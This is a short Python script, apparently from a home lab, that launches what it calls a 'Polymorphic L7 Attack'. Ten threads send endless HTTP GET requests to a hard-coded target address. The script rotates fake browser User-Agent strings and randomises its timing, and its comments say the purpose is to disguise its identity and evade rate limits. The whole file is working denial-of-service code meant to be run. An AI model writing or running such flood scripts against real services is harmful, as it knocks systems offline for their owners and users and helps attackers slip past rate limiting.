# smart_attacker.py
# Role: The Red Team Generator (Polymorphic Bot)
# OS: Kali Linux
import requests
import time
import random
import threading

# !!! UPDATE THIS IP TO MATCH YOUR WINDOWS HOST !!!
TARGET_IP = "http://172.18.41.58:8080" 

# Disguises (User-Agents)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

def attack():
    while True:
        try:
            # 1. Polymorphism: Change Identity
            ua = random.choice(USER_AGENTS)
            headers = {'User-Agent': ua}
            
            # 2. Jitter: Randomize timing (evade rate limits)
            time.sleep(random.uniform(0.1, 0.5))
            
            # 3. Launch Request
            response = requests.get(TARGET_IP, headers=headers, timeout=5)
            print(f"[*] Sent packet as {ua[:25]}... | Status: {response.status_code}")
        except Exception as e:
            print(f"[!] Connection Failed: {e}")
            time.sleep(2)

print(f"[*] Launching Polymorphic L7 Attack on {TARGET_IP}...")
print("[*] Press Ctrl+C to stop.")

# Multithreading: Simulates multiple bots
for i in range(10):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
